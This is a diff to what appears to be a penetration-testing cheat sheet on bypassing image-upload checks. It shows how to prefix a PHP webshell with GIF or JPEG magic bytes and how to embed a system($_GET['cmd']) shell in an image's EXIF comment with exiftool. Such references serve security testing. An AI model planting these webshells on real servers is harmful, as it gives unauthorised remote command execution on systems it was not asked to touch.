@@ -90,7 +90,11 @@ JSP: .jsp, .jspx, .jsw, .jsv, and .jspf
 Coldfusion: .cfm, .cfml, .cfc, .dbm
 ```
 
-#### Use GIF89a
+#### Magic number
+
+An image is identified by its first bytes. It is possible to hide a webshell by including a valid img header at the beginning of the webshell file.
+
+###### ➤ GIF
 ```
 Basically you just add the text "GIF89a;" before you shell-code. As exemple :
 
@@ -100,9 +104,15 @@ system($_GET['cmd']);//or you can insert your complete shell code
 ?>
 ```
 
-#### Include in image
+###### ➤ JPEG
 ```
-exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
+printf "\xff\xd8\xff\xe0<?php system('id'); ?>" > image?jpg
+```
+
+
+#### Inject PHP code into into information/comment of the image
+```
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
 ```
 
 ```
